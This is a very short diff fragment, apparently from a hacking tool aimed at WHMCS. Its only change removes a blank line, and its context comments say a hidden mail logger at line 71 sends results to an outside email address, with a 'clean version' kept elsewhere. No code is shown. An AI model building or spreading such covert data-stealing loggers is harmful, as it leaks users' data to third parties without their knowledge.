@@ -1,5 +1,4 @@
 
-
 //mail logger at line 71, to this mail byhero44@gmail.com
 //for clean version check WHMCS-Killer-Fucked.txt
 
